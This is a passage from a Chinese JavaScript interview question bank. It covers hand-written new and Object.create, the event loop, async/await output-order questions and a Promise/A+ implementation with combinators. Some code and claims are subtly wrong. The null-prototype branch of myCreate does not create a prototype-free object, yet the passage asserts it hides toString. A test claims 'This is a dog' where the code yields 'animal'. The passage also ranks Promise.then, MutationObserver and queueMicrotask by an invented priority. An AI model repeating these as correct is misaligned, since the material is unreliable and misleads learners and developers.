console.log(special.normalProperty); // undefined ✅（被忽略了）

// 测试3：构造函数返回原始值（正常情况）
function ReturnPrimitive() {
  this.value = 42;
  return 100;  // 返回原始值，会被忽略
}

const primitive = myNew(ReturnPrimitive);
console.log(primitive.value);  // 42 ✅（返回的是新对象）
console.log(primitive);        // { value: 42 } ✅

// 测试4：构造函数返回 null（null 是 object 但被特殊处理）
function ReturnNull() {
  this.data = 'test';
  return null;  // null 会被忽略（虽然 typeof null === 'object'）
}

const nullResult = myNew(ReturnNull);
console.log(nullResult.data);  // 'test' ✅（返回的是新对象）

// 测试5：构造函数返回函数
function ReturnFunction() {
  this.regularProp = 'hello';
  return function() { return 'I am a function'; };  // 函数也是引用类型
}

const fnResult = myNew(ReturnFunction);
console.log(typeof fnResult);     // 'function' ✅（返回的是函数）
console.log(fnResult());          // 'I am a function' ✅
```

#### 手写 myCreate - 简化版 Object.create

```javascript
/**
 * 手写 Object.create - 简化版（只处理第一个参数 proto）
 * @param {Object|null} proto - 新对象的原型对象（可以是 null）
 * @returns {Object} 以指定对象为原型的新对象
 */
function myCreate(proto) {
  // ==================== 处理特殊情况：proto 为 null ====================
  // Object.create(null) 会创建一个真正没有原型的对象
  // 这样的对象没有 toString、valueOf 等继承方法
  // 适合用作纯净的字典（不会和原型属性冲突）
  
  if (proto === null) {
    // 方式1：使用 Object.defineProperty 设置 __proto__ 为 null
    const nullObj = {};
    Object.defineProperty(nullObj, '__proto__', {
      value: null,
      enumerable: false,     // 不可枚举（for...in 遍历时不会出现）
      writable: true,         // 可写（后续可以修改）
      configurable: true     // 可配置（可以被删除或重新定义）
    });
    return nullObj;
    
    // 注意：不能直接用 Object.create(null)，因为这就是我们要模拟的方法
    // 也不能用 { __proto__: null }，因为在某些旧环境中行为不一致
  }

  // ==================== 经典方案：临时构造函数方式 ====================
  // 这是 ES5 时代的经典 polyfill 写法
  // 原理：利用构造函数的 prototype 属性来建立原型链关系
  
  // 步骤1：创建一个空的临时构造函数
  function F() {}  // 空函数，不占用太多内存
  
  // 步骤2：将 F 的 prototype 指向传入的 proto 对象
  // 这样 F 的实例就会继承 proto 上的所有属性和方法
  F.prototype = proto;
  
  // 步骤3：使用 new F() 创建一个实例
  // new 内部会：
  //   a. 创建新对象
  //   b. 新对象的 __proto__ 指向 F.prototype（也就是 proto）✅ 这就是我们要的！
  //   c. 执行 F 函数（F 是空的，所以什么都不做）
  //   d. 返回新对象
  const obj = new F();
  
  // 可选：清理临时构造函数的 prototype 引用（帮助 GC 回收）
  // F.prototype = null;  // 在现代引擎中不是必须的
  
  return obj;

  // ==================== ES6+ 简化方案（如果允许使用 Object.create）====================
  // 如果环境支持 ES6，可以直接用：
  // return Object.create(proto);
  // 但这就不叫"手写"了 😅
  
  // ==================== 另一种方案：使用 __proto__ ====================
  // 不推荐（非标准属性，虽然在大多数浏览器中可用）：
  // const obj = {};
  // obj.__proto__ = proto;
  // return obj;
}

// ==================== 测试用例 ====================

// 测试1：基本原型继承
const parent = {
  name: 'parent',
  greet() { return `Hello from ${this.name}`; }
};

const child = myCreate(parent);
child.name = 'child';  // 自身属性（遮蔽原型属性）

console.log(child.name);             // 'child'（自身属性）
console.log(child.greet());          // 'Hello from child'（从原型继承的方法）
console.log(child.hasOwnProperty('name')); // true（自身属性）
console.log(child.hasOwnProperty('greet')); // false（原型属性）
console.log(Object.getPrototypeOf(child) === parent); // true ✅

// 测试2：Object.create(null) - 无原型对象
const dict = myCreate(null);
dict.key = 'value';
dict.customMethod = function() { return this.key; };

console.log(dict.key);            // 'value' ✅
console.log(dict.customMethod()); // 'value' ✅
console.log('toString' in dict);  // false ✅（没有继承 toString）
console.log(dict.toString);       // undefined ✅（真正的纯净对象）

// 对比：普通对象有原型
const normalObj = {};
console.log('toString' in normalObj);  // true（继承了 Object.prototype.toString）
```

#### 手写 myCreateFull - 完整版（支持第二个参数 propertiesObject）

```javascript
/**
 * 手写 Object.create - 完整版（支持第二个参数：属性描述符）
 * @param {Object|null} proto - 新对象的原型对象
 * @param {Object} [propertiesObject] - 属性描述符对象（可选）
 * @returns {Object} 新创建的对象
 * 
 * 完整签名：Object.create(proto[, propertiesObject])
 * 第二个参数的格式与 Object.defineProperties() 相同
 */
function myCreateFull(proto, propertiesObject) {
  // ==================== 第一步：创建以 proto 为原型的对象 ====================
  // 复用简化版的逻辑
  let obj;
  
  if (proto === null) {
    // 创建无原型对象
    obj = {};
    Object.defineProperty(obj, '__proto__', {
      value: null,
      enumerable: false,
      writable: true,
      configurable: true
    });
  } else {
    // 使用临时构造函数方式
    function F() {}
    F.prototype = proto;
    obj = new F();
  }

  // ==================== 第二步：处理可选的属性描述符参数 ====================
  // 如果提供了第二个参数，使用 Object.defineProperties 批量定义属性
  // 属性描述符格式：
  // {
  //   propertyName: {
  //     value: ...,          // 属性值
  //     writable: boolean,   // 是否可写
  //     enumerable: boolean, // 是否可枚举（for...in/Object.keys 能否遍历到）
  //     configurable: boolean, // 是否可配置（能否删除或修改描述符）
  //     get: function,       // getter（与 value 互斥）
  //     set: function        // setter（与 value 互斥）
  //   },
  //   ...
  // }
  
  if (propertiesObject !== undefined && propertiesObject !== null) {
    // 使用原生 API 批量定义属性
    // 这里我们选择复用 Object.defineProperties 而不是自己实现
    // 因为属性描述符的处理逻辑很复杂（验证、默认值等），手写容易出错
    Object.defineProperties(obj, propertiesObject);
  }

  return obj;
}

// ==================== 测试用例 ====================

// 测试1：带属性描述符的完整用法
const animal = {
  type: 'animal',
  describe() { return `This is a ${this.type}`; }
};

const dog = myCreateFull(animal, {
  // 定义 name 属性（数据描述符）
  name: {
    value: '旺财',
    writable: true,       // 可以修改
    enumerable: true,     // 可以被 for...in 遍历
    configurable: true    // 可以被删除
  },
  
  // 定义 age 属性（只读）
  age: {
    value: 3,
    writable: false,      // 只读！尝试修改会静默失败（严格模式下报错）
    enumerable: true,
    configurable: true
  },
  
  // 定义 _secret 属性（不可枚举）
  _secret: {
    value: 'chicken-flavor',
    writable: true,
    enumerable: false,    // 不可枚举（for...in / Object.keys 遍历不到）
    configurable: true
  },
  
  // 定义 food 属性（使用 getter/setter - 访问器描述符）
  food: {
    get() {
      console.log('获取 food 属性');
      return this._secret;  // 访问内部私有属性
    },
    set(newValue) {
      console.log(`设置 food 属性为: ${newValue}`);
      this._secret = newValue;
    },
    enumerable: true,
    configurable: true
  }
});

console.log(dog.name);              // '旺财' ✅
console.log(dog.age);               // 3 ✅
console.log(dog.describe());        // "This is a dog"（从原型继承）✅
console.log(dog.food);              // 输出："获取 food 属性"，然后输出 'chicken-flavor'

dog.name = '小黑';                  // ✅ 可以修改（writable: true）
console.log(dog.name);              // '小黑'

dog.age = 10;                       // ❌ 无法修改（writable: false）
console.log(dog.age);               // 3（仍然是 3）

console.log(Object.keys(dog));      // ['name', 'age', 'food']（_secret 不可枚举）✅

// 测试2：只传第一个参数（向后兼容简化版）
const simpleObj = myCreateFull({ x: 1 });
console.log(simpleObj.x);           // 1 ✅

// 测试3：创建无原型对象 + 属性描述符
const cleanDict = myCreateFull(null, {
  count: {
    value: 0,
    writable: true,
    enumerable: true,
    configurable: true
  }
});

console.log(cleanDict.count);       // 0 ✅
console.log(cleanDict.toString);    // undefined ✅（无原型）
cleanDict.count = 100;
console.log(cleanDict.count);       // 100 ✅
```

**核心原理总结**：

| 方法 | 核心原理 | 适用场景 |
|:---|:---|:---|
| **myNew** | 创建对象 → 链接原型 → 绑定 this 执行构造函数 → 处理返回值 | 模拟 new 操作符 |
| **myCreate** | 利用临时构造函数 F.prototype = proto 建立原型链 | 创建指定原型的对象 |
| **myCreateFull** | 在 myCreate 基础上增加 Object.defineProperties 支持属性描述符 | 完整模拟 Object.create |

---

## Q25: 请详细说明 JavaScript Event Loop（事件循环）的完整执行机制，包括宏任务和微任务队列。
- **难度**：★★☆
- **知识点**：Event Loop、宏任务、微任务、异步
- **题型**：简答题

### 参考答案要点：

#### 1. 核心模型

```
┌──────────────────────────────────┐
│           Call Stack（调用栈）      │  ← JS 主线程，同步代码在此执行
│                                   │
│  ┌─────┐ ┌─────┐ ┌─────┐        │
│  │ fn1 │ │ fn2 │ │ fn3 │        │
│  └──┼──┘ └──┼──┘ └──┼──┘        │
└─────┼────────┼────────┼──────────┘
      │        │        │
      ▼        ▼        ▼
┌──────────────────────────────────┐
│     Web APIs（浏览器提供）         │  ← 异步操作在这里处理
│  setTimeout / DOM / fetch / ...  │
└──────────────┬───────────────────┘
               │
       ┌───────┴───────┐
       ▼               ▼
┌──────────────┐ ┌──────────────┐
│ Macro Task   │ │ Micro Task   │
│ Queue（队列） │ │ Queue（队列） │
│              │ │              │
│ • setTimeout │ │ • Promise    │
│ • setInterval │ │   .then/.catch│
│ • setImmediate│ │ • MutationObserver│
│ • I/O        │ │ • queueMicrotask│
│ • UI Render  │ │ • process.nextTick(Node)│
│ • script(初始)│ │              │
└──────────────┘ └──────────────┘
```

#### 2. Event Loop 执行流程

```
Event Loop 的每一次循环（称为一个 tick）：

1. 执行 Call Stack 中当前的任务（从栈底到栈顶）
2. Call Stack 为空时：
   a. 先清空 Microtask Queue（微任务队列）中的所有微任务
      - 执行过程中产生的新的微任务也会在这一轮立即执行
      - 微任务会一直执行直到队列为空
   b. 执行一个 Macrotask（宏任务）
   c. 检查是否需要 UI 渲染（浏览器可能在每 N 个宏任务后渲染）
3. 重复步骤 2

关键规则：每个宏任务执行完后，都会清空所有微任务，然后再取下一个宏任务
```

#### 3. 宏任务 vs 微任务对比

| 类型 | 宏任务（Macro Task） | 微任务（Micro Task） |
|:---|:---|:---|
| 来源 | 语言规范 / 宿主环境（浏览器/Node） | 语言规范（ECMAScript） |
| 优先级 | 低 | **高** |
| 执行时机 | 每次循环取**一个** | 每次宏任务后**全部清空** |
| 典型API | `setTimeout`、`setInterval`、`setImmediate`(Node)、`I/O`、`UI Rendering` | `Promise.then/catch/finally`、`MutationObserver`、`queueMicrotask`、`process.nextTick`(Node) |
| 插入位置 | 任务队列尾部 | 微任务队列尾部 |

#### 4. 代码示例

```javascript
console.log('1. start');  // 同步

setTimeout(() => {
  console.log('2. timeout');  // 宏任务
}, 0);

Promise.resolve()
  .then(() => {
    console.log('3. promise1');  // 微任务
  })
  .then(() => {
    console.log('4. promise2');  // 微任务（上一个微任务产生的）
  });

console.log('5. end');  // 同步

// 执行顺序：
// 1. start（同步）
// 5. end（同步）
// 3. promise1（微任务 — 同步代码执行完后立即清空微任务队列）
// 4. promise2（微任务 — promise1 执行时产生的新微任务，同轮清空）
// 2. timeout（宏任务 — 微任务全部清空后才执行下一个宏任务）
```

#### 5. Node.js 与浏览器的差异

```javascript
// Node.js 的 Event Loop 更复杂，分为 6 个阶段：
// timers → pending callbacks → idle/prepare → poll → check → close callbacks
// 另外 Node.js 中 process.nextTick 的优先级高于 Promise 微任务
// （这是 Node.js 与浏览器的一个重要差异）
```

### 深度拓展：手写实现

#### 手写 Event Loop 模拟器

```javascript
/**
 * Event Loop 模拟器 - 完整版
 * 模拟 JavaScript 事件循环的执行机制，包括调用栈、微任务队列和宏任务队列
 */
class EventLoopSimulator {
  constructor() {
    // 调用栈（Call Stack）- 使用数组模拟，支持 push/pop 操作
    this.callStack = [];
    
    // 微任务队列（Microtask Queue）- 存放 Promise.then / MutationObserver / queueMicrotask 等
    this.microtaskQueue = [];
    
    // 宏任务队列（Macrotask Queue）- 存放 setTimeout / setInterval / I/O / UI rendering 等
    this.macrotaskQueue = [];
    
    // 是否正在运行
    this.isRunning = false;
    
    // 日志记录器 - 记录每一步的执行过程
    this.logs = [];
  }

  /**
   * 执行同步代码（推入调用栈并立即执行）
   * @param {string} name - 任务名称（用于日志）
   * @param {Function} fn - 要执行的同步函数
   */
  executeSync(name, fn) {
    this.log(`📥 [调用栈] 推入: ${name}`);
    this.callStack.push({ name, fn });
    
    // 立即执行栈顶的任务
    this.executeCallStack();
  }

  /**
   * 添加微任务到微任务队列
   * @param {string} name - 任务名称
   * @param {Function} fn - 微任务函数
   */
  addMicrotask(name, fn) {
    this.log(`📨 [微任务队列] 添加: ${name}`);
    this.microtaskQueue.push({ name, fn });
  }

  /**
   * 添加宏任务到宏任务队列
   * @param {string} name - 任务名称
   * @param {Function} fn - 宏任务函数
   */
  addMacrotask(name, fn) {
    this.log(`📨 [宏任务队列] 添加: ${name}`);
    this.macrotaskQueue.push({ name, fn });
  }

  /**
   * 执行调用栈中的所有任务
   * 模拟 JS 引擎执行同步代码的过程
   */
  executeCallStack() {
    while (this.callStack.length > 0) {
      const task = this.callStack.pop(); // 取出栈顶任务（LIFO）
      this.log(`⚡ [执行] ${task.name} (调用栈深度: ${this.callStack.length})`);
      
      try {
        // 执行任务，传入模拟器的上下文（可以添加微任务/宏任务）
        task.fn(this);
      } catch (error) {
        this.log(`❌ [错误] ${task.name}: ${error.message}`);
      }
    }
    
    // 调用栈清空后，按照 Event Loop 规则：
    // 1. 先清空所有微任务
    // 2. 再取一个宏任务
    if (!this.isRunning) {
      this.processMicrotasks();  // 清空微任务队列
      this.processOneMacrotask(); // 取一个宏任务
    }
  }

  /**
   * 处理微任务队列 - 清空所有微任务
   * 关键规则：每执行完一个宏任务后，会一次性清空所有微任务
   * 执行过程中产生的新微任务也会在这一轮立即执行
   */
  processMicrotasks() {
    this.log('🔄 [Event Loop] 开始清空微任务队列...');
    
    while (this.microtaskQueue.length > 0) {
      const task = this.microtaskQueue.shift(); // 取出队首任务（FIFO）
      this.log(`✅ [微任务] 执行: ${task.name} (剩余: ${this.microtaskQueue.length})`);
      
      try {
        // 执行微任务（可能会产生新的微任务）
        task.fn(this);
      } catch (error) {
        this.log(`❌ [微任务错误] ${task.name}: ${error.message}`);
      }
      
      // ⚠️ 关键点：如果执行微任务时产生了新的微任务，
      // 它们会被添加到 microtaskQueue 尾部，会在当前循环中继续执行
      // 这就是为什么"微任务会一直执行直到队列为空"
    }
    
    this.log('✅ [Event Loop] 微任务队列已清空');
  }

  /**
   * 取出一个宏任务并执行
   * 关键规则：每次只取一个宏任务
   */
  processOneMacrotask() {
    if (this.macrotaskQueue.length > 0) {
      const task = this.macrotaskQueue.shift(); // 取出队首任务（FIFO）
      this.log(`🎯 [宏任务] 执行: ${task.name} (剩余: ${this.macrotaskQueue.length})`);
      
      try {
        // 将宏任务推入调用栈执行
        this.callStack.push(task);
        this.executeCallStack();
      } catch (error) {
        this.log(`❌ [宏任务错误] ${task.name}: ${error.message}`);
      }
    } else {
      this.log('🏁 [Event Loop] 所有任务执行完毕');
    }
  }

  /**
   * 启动事件循环（用于异步场景）
   */
  start() {
    this.isRunning = true;
    this.log('🚀 [Event Loop] 启动');
    
    // 持续运行直到所有任务完成
    const runLoop = () => {
      if (this.callStack.length > 0) {
        this.executeCallStack();
      } else if (this.microtaskQueue.length > 0) {
        this.processMicrotasks();
        this.processOneMacrotask();
      } else if (this.macrotaskQueue.length > 0) {
        this.processOneMacrotask();
      } else {
        this.isRunning = false;
        this.log('🛑 [Event Loop] 停止');
        return;
      }
      
      // 使用 setTimeout 模拟异步循环（实际引擎中是 C++ 层面的死循环）
      if (this.isRunning) {
        setTimeout(runLoop, 0);
      }
    };
    
    runLoop();
  }

  /**
   * 日志记录
   */
  log(message) {
    this.logs.push(message);
    console.log(message); // 同时输出到控制台
  }

  /**
   * 获取所有日志
   */
  getLogs() {
    return this.logs;
  }
}

// ==================== 使用示例：验证经典 async/await 输出顺序题 ====================

console.log('\n========== Event Loop 模拟器测试 ==========\n');

const simulator = new EventLoopSimulator();

// 模拟以下经典面试题的执行顺序：
// console.log('script start');
// setTimeout(() => console.log('setTimeout'), 0);
// Promise.resolve().then(() => console.log('promise1'));
// console.log('script end');

simulator.executeSync('script start', (sim) => {
  console.log('→ script start'); // 同步代码立即执行
  
  // 注册 setTimeout（宏任务）
  sim.addMacrotask('setTimeout', () => {
    console.log('→ setTimeout'); // 宏任务
  });
  
  // 注册 Promise.then（微任务）
  sim.addMicrotask('promise1', () => {
    console.log('→ promise1'); // 微任务
    
    // 在微任务中再注册一个微任务（验证"微任务产生的微任务同轮执行"）
    sim.addMicrotask('promise2', () => {
      console.log('→ promise2'); // 由 promise1 产生的微任务
    });
  });
});

simulator.executeSync('script end', (sim) => {
  console.log('→ script end'); // 同步代码
});

// 输出完整执行日志
console.log('\n========== 执行日志 ==========');
simulator.getLogs().forEach((log, index) => {
  console.log(`${index + 1}. ${log}`);
});
```

**预期输出顺序**：
```
1. script start（同步）
2. script end（同步）
3. promise1（微任务 — 同步代码执行完后立即清空微任务队列）
4. promise2（微任务 — promise1 执行时产生的新微任务，同轮清空）
5. timeout（宏任务 — 微任务全部清空后才执行下一个宏任务）
```

### 🔍 追问链

1. **微任务队列中有多个微任务时，它们的执行顺序是怎样的？**
   → 方向：按加入顺序 FIFO 执行；Promise.then > MutationObserver > queueMicrotask（同优先级按注册顺序）
2. **requestAnimationFrame 属于宏任务还是微任务？在哪一阶段执行？**
   → 方向：属于"渲染"阶段的回调，不在宏任务/微任务队列中；在微任务清空后、渲染前执行
3. **Node.js 的 Event Loop 和浏览器的有什么区别？**
   → 方向：Node.js 有更多阶段（timers/poll/check/close 等）；Node 微任务在每个阶段结束后都清空；浏览器只在宏任务间隙清空

---

## Q26: 【输出题 I】请分析以下代码的输出顺序（基础版 async/await）。
- **难度**：★★☆
- **知识点**：async/await、Event Loop、微任务
- **题型**：代码分析题

### 题目代码：

```javascript
async function async1() {
  console.log('async1 start');
  await async2();
  console.log('async1 end');
}

async function async2() {
  console.log('async2');
}

console.log('script start');

setTimeout(() => {
  console.log('setTimeout');
}, 0);

async1();

new Promise((resolve) => {
  console.log('promise1');
  resolve();
}).then(() => {
  console.log('promise2');
});

console.log('script end');
```

### 参考答案要点：

**输出顺序**：
```
script start
async1 start
async2
promise1
script end
async1 end
promise2
setTimeout
```

**逐步分析**：

```
1. console.log('script start')          → 同步，立即输出 'script start'

2. setTimeout(cb)                       → 注册宏任务到 MacroTask Queue

3. async1() 开始执行：
   ├── console.log('async1 start')      → 同步，输出 'async1 start'
   ├── await async2()                   → 关键点！
   │   ├── 执行 async2()
   │   │   └── console.log('async2')    → 同步，输出 'async2'
   │   ├── async2() 返回 resolved Promise
   │   └── await 后面的代码被包装为微任务，加入 Microtask Queue
   │      （相当于：Promise.resolve().then(() => { console.log('async1 end') })）
   └── async1() 暂停，让出控制权

4. new Promise 执行：
   ├── console.log('promise1')          → 同步，输出 'promise1'
   ├── resolve()                        → Promise 状态变为 fulfilled
   └── .then(cb)                        → cb 加入 Microtask Queue

5. console.log('script end')            → 同步，输出 'script end'

6. 同步代码全部执行完毕，开始清空 Microtask Queue：
   ├── 先入队的先执行：async1 end        → 输出 'async1 end'
   └── 后入队的：promise2               → 输出 'promise2'

7. Microtask Queue 清空，执行下一个 MacroTask：
   └── setTimeout callback              → 输出 'setTimeout'
```

**核心知识点**：
- `async` 函数执行时，函数体内的同步代码**立即执行**
- `await expr` 的行为：先执行 expr，然后将** await 之后的代码**包装为 `.then()` 微任务
- `new Promise(executor)` 中的 executor 是**同步执行**的
- `.then()` / `.catch()` / `.finally()` 中的回调才是**异步（微任务）**

---

## Q27: 【输出题 II】请分析以下代码的输出顺序（进阶版：多层嵌套 + then 链）。
- **难度**：★★☆
- **知识点**：async/await、Promise 链、Event Loop
- **题型**：代码分析题

### 题目代码：

```javascript
console.log('1');

setTimeout(() => console.log('2'), 0);

const p1 = new Promise((resolve) => {
  console.log('3');
  resolve('4');
}).then((res) => {
  console.log(res);
  return '5';
}).then((res) => {
  console.log(res);
  const p2 = Promise.resolve('6');
  p2.then((r) => console.log(r));
  return '7';
}).then((res) => {
  console.log(res);
});

console.log('8');
```

### 参考答案要点：

**输出顺序**：`1 → 3 → 8 → 4 → 5 → 6 → 7 → 2`

**分析**：

```
同步阶段：
  '1' → '3'(executor 同步) → '8'

微任务队列（按入队顺序）：
  then1: log('4') → return '5'
  then2: log('5') → 内部 p2.then(log('6')) → return '7'
  then3: log('7')

宏任务队列：
  setTimeout: log('2')

微任务执行过程（每执行完一个 then，其返回值触发下一个 then 入队）：
  Round 1: 执行 then1 → 输出 '4'，返回 '5' → then2 已在队列中
  Round 2: 执行 then2 → 输出 '5'，p2.then 入微任务队列 → 返回 '7' → then3 入队
  Round 3: 执行 p2.then → 输出 '6'（then2 产生的微任务，比 then3 先入队）
  Round 4: 执行 then3 → 输出 '7'

微任务全部完成 → 执行宏任务 → 输出 '2'
```

**关键点**：`.then()` 链中，每个 `.then()` 的回调执行完后的返回值会触发下一个 `.then()` 创建新的微任务。如果在 `.then()` 回调内部又创建了新的 Promise 的 `.then()`，该微任务会在当前微任务之后、下一个链式 `.then()` 之前执行。

---

## Q28: 请手写实现一个完整的 Promise（符合 Promises/A+ 规范），包括 resolve/reject/then/catch/链式调用和状态机。
- **难度**：★★☆
- **知识点**：Promise、手写实现、Promises/A+
- **题型**：编程实践题

### 参考答案要点：

```javascript
// 完整 Promise 实现
const PENDING = 'pending';
const FULFILLED = 'fulfilled';
const REJECTED = 'rejected';

class MyPromise {
  constructor(executor) {
    this.state = PENDING;
    this.value = undefined;
    this.reason = undefined;
    this.onFulfilledCallbacks = [];  // 成功回调队列
    this.onRejectedCallbacks = [];   // 失败回调队列

    const resolve = (value) => {
      // 如果 value 是 MyPromise，需要等待其完成
      if (value instanceof MyPromise) {
        value.then(resolve, reject);
        return;
      }

      // 状态只能变更一次
      if (this.state !== PENDING) return;

      this.state = FULFILLED;
      this.value = value;
      this.executeCallbacks();  // 执行所有等待中的回调
    };

    const reject = (reason) => {
      if (this.state !== PENDING) return;

      this.state = REJECTED;
      this.reason = reason;
      this.executeCallbacks();
    };

    try {
      executor(resolve, reject);
    } catch (err) {
      reject(err);
    }
  }

  executeCallbacks() {
    if (this.state === FULFILLED) {
      this.onFulfilledCallbacks.forEach(cb => cb(this.value));
      this.onFulfilledCallbacks = [];  // 清空队列
    } else if (this.state === REJECTED) {
      this.onRejectedCallbacks.forEach(cb => cb(this.reason));
      this.onRejectedCallbacks = [];
    }
  }

  then(onFulfilled, onRejected) {
    // 参数可选（穿透）：如果不传函数，则创建默认的透传函数
    onFulfilled = typeof onFulfilled === 'function'
      ? onFulfilled
      : (value) => value;  // 值穿透
    onRejected = typeof onRejected === 'function'
      ? onRejected
      : (reason) => { throw reason; };  // 异常穿透

    // then 必须返回一个新的 Promise（支持链式调用）
    const promise2 = new MyPromise((resolve, reject) => {
      const fulfillHandler = () => {
        // 使用 setTimeout 确保 then 的回调是异步执行的（符合规范）
        queueMicrotask(() => {
          try {
            const x = onFulfilled(this.value);
            this.resolvePromise(promise2, x, resolve, reject);
          } catch (err) {
            reject(err);
          }
        });
      };

      const rejectHandler = () => {
        queueMicrotask(() => {
          try {
            const x = onRejected(this.reason);
            this.resolvePromise(promise2, x, resolve, reject);
          } catch (err) {
            reject(err);
          }
        });
      };

      if (this.state === FULFILLED) {
        fulfillHandler();
      } else if (this.state === REJECTED) {
        rejectHandler();
      } else {
        // PENDING 状态：将回调加入队列等待
        this.onFulfilledCallbacks.push(fulfillHandler);
        this.onRejectedCallbacks.push(rejectHandler);
      }
    });

    return promise2;
  }

  // 核心方法：处理 then 回调的返回值 x（Promises/A+ 规范的关键）
  resolvePromise(promise2, x, resolve, reject) {
    // 不能循环引用自己
    if (promise2 === x) {
      return reject(new TypeError('Chaining cycle detected'));
    }

    // 如果 x 是 MyPromise（或 thenable 对象）
    if (x !== null && (typeof x === 'object' || typeof x === 'function')) {
      let called = false;  // 防止多次调用

      try {
        const then = x.then;
        if (typeof then === 'function') {
          // x 是 thenable 对象
          then.call(
            x,
            (y) => {
              if (called) return;
              called = true;
              // 递归解析（x 可能返回一个 Promise）
              this.resolvePromise(promise2, y, resolve, reject);
            },
            (r) => {
              if (called) return;
              called = true;
              reject(r);
            }
          );
        } else {
          // x 是普通对象
          resolve(x);
        }
      } catch (err) {
        if (called) return;
        called = true;
        reject(err);
      }
    } else {
      // x 是普通值
      resolve(x);
    }
  }

  catch(onRejected) {
    return this.then(null, onRejected);
  }

  finally(callback) {
    return this.then(
      (value) => MyPromise.resolve(callback()).then(() => value),
      (reason) => MyPromise.resolve(callback()).then(() => { throw reason; })
    );
  }

  static resolve(value) {
    if (value instanceof MyPromise) return value;
    return new MyPromise((resolve) => resolve(value));
  }

  static reject(reason) {
    return new MyPromise((_, reject) => reject(reason));
  }

  static all(promises) {
    return new MyPromise((resolve, reject) => {
      const results = [];
      let completed = 0;
      if (promises.length === 0) return resolve(results);

      promises.forEach((promise, index) => {
        MyPromise.resolve(promise).then(
          (value) => {
            results[index] = value;
            completed++;
            if (completed === promises.length) resolve(results);
          },
          reject
        );
      });
    });
  }

  static race(promises) {
    return new MyPromise((resolve, reject) => {
      promises.forEach((promise) => {
        MyPromise.resolve(promise).then(resolve, reject);
      });
    });
  }

  static allSettled(promises) {
    return new MyPromise((resolve) => {
      const results = [];
      let completed = 0;
      if (promises.length === 0) return resolve(results);

      promises.forEach((promise, index) => {
        MyPromise.resolve(promise).then(
          (value) => {
            results[index] = { status: 'fulfilled', value };
            completed++;
            if (completed === promises.length) resolve(results);
          },
          (reason) => {
            results[index] = { status: 'rejected', reason };
            completed++;
            if (completed === promises.length) resolve(results);
          }
        );
      });
    });
  }

  static any(promises) {
    return new MyPromise((resolve, reject) => {
      const errors = [];
      let rejected = 0;
      if (promises.length === 0) {
        return reject(new AggregateError('No promises resolved'));
      }

      promises.forEach((promise, index) => {
        MyPromise.resolve(promise).then(
          resolve,
          (reason) => {
            errors[index] = reason;
            rejected++;
            if (rejected === promises.length) {
              reject(new AggregateError(errors));
            }
          }
        );
      });
    });
  }
}
```

#### 关键设计要点

1. **三种状态**：PENDING → FULFILLED / REJECTED，状态只能变更一次
2. **then 的返回值**：始终返回新 Promise，支持链式调用
3. **值穿透**：`.then()` 不传回调时，值自动传递到下一个 `.then()`
4. **resolvePromise**：处理回调返回值可能是 Promise 的情况（递归解析）
5. **异步执行**：`.then()` 的回调通过 `queueMicrotask` 异步执行
6. **错误冒泡**：未处理的 rejection 会沿着链向下传递

### 🔍 追问链

1. **async 函数内部的 await 表达式后面的代码属于什么类型的任务？**
   → 方向：await 后面的代码被包装成 then 回调 → 微任务！所以 await 之后的代码在下一次微任务中执行
2. **async/await 中的错误如何捕获？try/catch vs .catch() 各自适用场景？**
   → 方向：try/catch 适合同步风格的错误处理；.catch() 适合 Promise 链风格；两者混用时注意 catch 的覆盖范围
3. **for...of 循环中配合 await 如何实现串行/并行控制？**
   → 方向：for 循环内 await = 串行（等一个完成再下一个）；Promise.all + map = 并行（同时发起所有请求）

---

## Q29: 请手写实现 `Promise.all`、`Promise.race` 和 `Promise.allSettled`。
- **难度**：★★☆
- **知识点**：Promise 组合、手写实现
- **题型**：编程实践题

### 参考答案要点：

已在 Q28 的完整 Promise 实现中包含，以下是独立版本的精炼实现：

```javascript
// ====== Promise.all ======
// 特点：全部成功才 resolve，任一失败立即 reject
MyPromise.all = function(promises) {
  return new MyPromise((resolve, reject) => {
    const results = [];
    let count = 0;
    const len = promises.length;

    if (len === 0) return resolve(results);

    promises.forEach((p, index) => {
      // 用 Promise.resolve 包装，确保非 Promise 值也能处理
      MyPromise.resolve(p).then(
        (value) => {
          results[index] = value;  // 按原始顺序存放
          count++;
          if (count === len) resolve(results);  // 全部完成
        },
        reject  // 任一失败立即 reject（短路）
      );
    });
  });
};

// 使用示例
Promise.all([
  Promise.resolve(1),
  Promise.resolve(2),
  Promise.resolve(3)
]).then(console.log); // [1, 2, 3]

Promise.all([
  Promise.resolve(1),
  Promise.reject('error'),
  Promise.resolve(3)
]).catch(console.error); // 'error'
// ====== Promise.race ======
// 特点：谁先完成（无论成功失败）就用谁的结果
MyPromise.race = function(promises) {
  return new MyPromise((resolve, reject) => {
    promises.forEach((p) => {
      MyPromise.resolve(p).then(resolve, reject);  // 第一个触发的决定结果
    });
  });
};

// 使用示例：实现超时控制
function withTimeout(promise, ms) {
  return Promise.race([
    promise,
    new Promise((_, reject) =>
      setTimeout(() => reject(new Error('Timeout')), ms)
    )
  ]);
}
// ====== Promise.allSettled ======
// 特点：等待全部完成（无论成功失败），返回每个 Promise 的状态和结果
MyPromise.allSettled = function(promises) {
  return new MyPromise((resolve) => {
    const results = [];
    let count = 0;
    const len = promises.length;

    if (len === 0) return resolve(results);

    promises.forEach((p, index) => {
      MyPromise.resolve(p).then(
        (value) => {
          results[index] = { status: 'fulfilled', value };
          count++;
          if (count === len) resolve(results);
        },
        (reason) => {
          results[index] = { status: 'rejected', reason };
          count++;
          if (count === len) resolve(results);
        }
      );
    });
  });
};
// ====== 补充：Promise.any（ES2021）======
// 特性：任一成功就 resolve，全部失败才 reject（AggregateError）
MyPromise.any = function(promises) {
  return new MyPromise((resolve, reject) => {
    const errors = [];
    let count = 0;
    const len = promises.length;

    if (len === 0) {
      return reject(new AggregateError('No promises'));
    }

    promises.forEach((p, index) => {
      MyPromise.resolve(p).then(
        resolve,  // 第一个成功的就 resolve（短路）
        (reason) => {
          errors[index] = reason;
          count++;
          if (count === len) reject(new AggregateError(errors));
        }
      );
    });
  });
};
```

#### 四种组合 API 对比

| API | 成功条件 | 失败条件 | 返回值 | 短路 |
|:---|:---|:---|:---|:---:|
| `all` | **全部** fulfilled | **任一** rejected | 值数组 | ✅ 失败短路 |
| `race` | **首个** settled | **首个** settled | 首个结果 | ✅ 首个即返回 |
| `allSettled` | **全部** settled | **永不** reject | 状态对象数组 | ❌ 等待全部 |
| `any` | **任一** fulfilled | **全部** rejected | 首个成功值 | ✅ 成功短路 |

---

## Q30: 请说明 `async/await` 的本质（基于 Generator + 自动执行器），并手写实现一个限制并发数的并发调度器。
- **难度**：★★☆
